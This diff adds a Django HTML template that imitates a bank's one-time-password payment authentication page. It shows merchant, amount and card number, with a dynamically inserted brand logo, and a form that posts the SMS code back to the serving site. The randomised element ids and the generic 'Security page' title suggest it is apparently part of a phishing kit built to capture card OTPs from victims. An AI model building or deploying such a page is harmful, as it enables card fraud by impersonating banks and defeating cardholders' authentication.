@@ -1,0 +1,114 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security page</title>
+    <link rel="stylesheet" href="{% static 'styles/global.css' %}">
+</head>
+
+
+<body style="margin:0">
+<div style="background:#00000094;position:relative;width:100%;height:100vh">
+    <div style="background:#fff;position:absolute;top:50%;left:50%;transform:translate(-50%, -50%);margin: 0 auto;border-radius:5px;width:97%;max-width:390px;height:auto;padding:24px;">
+        <div style="display:flex;flex-wrap:wrap;justify-content:space-between;margin-bottom:10px">
+            <div class="flex: 0 0 50%;">
+                <img data-real-id="project-logo" style="width:200px;height:50px;" src="{% static 'assets/logo.svg' %}"
+                     alt="">
+            </div>
+            <div class="flex: 0 0 50%;">
+                <img data-real-id="brand-logo" style="width:100px;height:50px;object-fit: contain;"
+                     src="{{ logo_path }}" alt="">
+            </div>
+        </div>
+        <form data-real-id="code-window" method="post">
+            {% csrf_token %}
+            <div style="font-size:18px;font-weight:bold">Payment Authentication</div>
+            <div style="border-top: 1px solid rgb(222, 222, 222);border-bottom: 1px solid rgb(222, 222, 222);padding-top:18px; margin-top:4px">
+                <div>A one-time password (“OTP”) has been sent by SMS to your mobile number. Please enter the 6-digit
+                    OTP to proceed with this online transaction.
+                </div>
+                <div style="margin-top:14px;">
+                    <div class="loader-overlay">
+                        <div class="loader"></div>
+                    </div>
+                    <div style="display:flex; margin-bottom:8px">
+                        <div style="flex: 0 0 41%; padding: 0 12px;text-align:right;opacity:.5">Merchant:</div>
+                        <div style="flex: 0 0 59%; padding: 0 12px"><span data-real-id="merchant">{{ merchant }}</span>
+                        </div>
+                    </div>
+                    <div style="display:flex; margin-bottom:8px">
+                        <div style="flex: 0 0 41%;padding: 0 12px;text-align:right;opacity:.5">Amount:</div>
+                        <div style="flex: 0 0 59%;padding: 0 12px">
+                            <span data-real-id="currency"></span> <span
+                                data-real-id="amount">{{ amount }} {{ currency }}</span>
+                        </div>
+                    </div>
+                    <div style="display:flex; margin-bottom:8px">
+                        <div style="flex: 0 0 41%;padding: 0 12px;text-align:right;opacity:.5">Date:</div>
+                        <div style="flex: 0 0 59%;padding: 0 12px">
+                            <span data-real-id="date">{{ date|date:"d/m/Y" }}</span>
+                        </div>
+                    </div>
+                    <div style="display:flex; margin-bottom:8px">
+                        <div style="flex: 0 0 41%;padding: 0 12px;text-align:right;opacity:.5">Card number:</div>
+                        <div style="flex: 0 0 59%;padding: 0 12px"><span
+                                data-real-id="card-number-text">{{ card_number }}</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div style="padding: 12px 0 0;border-bottom: 1px solid rgb(222, 222, 222);">
+                <label>
+                    <input data-real-id="code" maxlength="6"
+                           name="code"
+                           style="border: 1px solid #dedede;background-color:#fff;border-radius:6px;font-size:14px;width:100%;text-align:center;padding:8px;"
+                           type="text" placeholder="SMS One-time password">
+                </label>
+
+                {#  Error case #}
+                <div style="min-height:18px;color:red">
+                    <div style="display:none" data-real-id="main-code-error">
+                        <div data-real-id="main-code-error-text"></div>
+                    </div>
+                    <div style="display:none" data-real-id="code-local-error"></div>
+                </div>
+
+            </div>
+            <div style="color:#333;margin-top:15px;">
+                Please stay on this page, your bank sends a verification SMS-code within
+                <b data-real-id="timer"
+                   style="color:#333"
+                   id="xteope">
+                    05:00s
+                </b>
+            </div>
+            <p type="link" data-real-id="resend-code" disabled style="cursor: pointer; color:gray;margin-top:12px;">
+                Haven't received a one-time passcode?
+            </p>
+
+            <div style="margin-top:15px;">
+                <button data-real-id="submit-button" class="xafwel">
+                    SUBMIT
+                </button>
+            </div>
+        </form>
+        <script src="{% static 'js/main.js' %}"></script>
+        <script src="{% static 'js/timer.js' %}"></script>
+
+        <div style="display:flex;justify-content:space-between;margin-top:5px;">
+            <a href="javascript:window.history.go(-1);" style="flex: 0 0 50%; color:#0177ef;" id="xwe1trx"
+               data-real-id="exit">
+                Exit
+            </a>
+            <a href="https://cdn.visa.com/dam/visa/vgb/visanotification/PFD_23_10_Visa_Security_Alert_MFA_and_OTP_Bypass_Schemes_Public_Copy.pdf"
+               style="flex: 0 0 50%; color:#0177ef; text-align:right;" class="xerfi">
+                Help
+            </a>
+        </div>
+
+    </div>
+</div>
+</body>
+</html>
